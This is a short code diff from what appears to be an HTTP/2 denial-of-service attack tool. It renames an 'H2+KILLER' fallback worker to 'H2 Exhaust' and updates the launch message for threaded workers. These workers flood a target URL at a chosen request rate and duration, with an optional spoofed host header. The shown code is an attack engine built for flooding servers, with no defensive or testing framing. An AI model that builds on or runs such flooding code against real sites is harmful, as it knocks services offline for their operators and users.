@@ -51,10 +51,10 @@ STATUS_LOG_PATH = "logs/auto_mode_v3_status.json"
 def _run_h2_worker_fallback(target: str, duration: int, rps: int,
                              worker_id: int, stats_queue, stop_event,
                              host_header: str = "", result_dict: dict = None):
-    """Thread target for Python H2+KILLER fallback in V5."""
+    """Thread target for Python H2 exhaust fallback in V5."""
     try:
-        from core.attack.engines.h2_killer_engine import run_killer_worker
-        run_killer_worker(
+        from core.attack.engines.h2_exhaust import run_h2_exhaust
+        run_h2_exhaust(
             target_url=target, rps=rps, duration=float(duration),
             worker_id=worker_id, stats_queue=stats_queue, stop_event=stop_event,
             host_header=host_header or None, connections=4,
@@ -2347,7 +2347,7 @@ class SmartAutoModeV5(SmartAutoModeV3):
                     )
                     th.start()
                     h2_tasks.append((th, h2_stop, h2_result, h2_stats_q))
-                print(f"      {_c('g','[+]')} {num_workers} H2+KILLER workers launched")
+                print(f"      {_c('g','[+]')} {num_workers} H2 Exhaust workers launched")
             else:
                 print(f"      {_c('y','[!]')} h2 library not installed - HTTP/1.1 only")
 
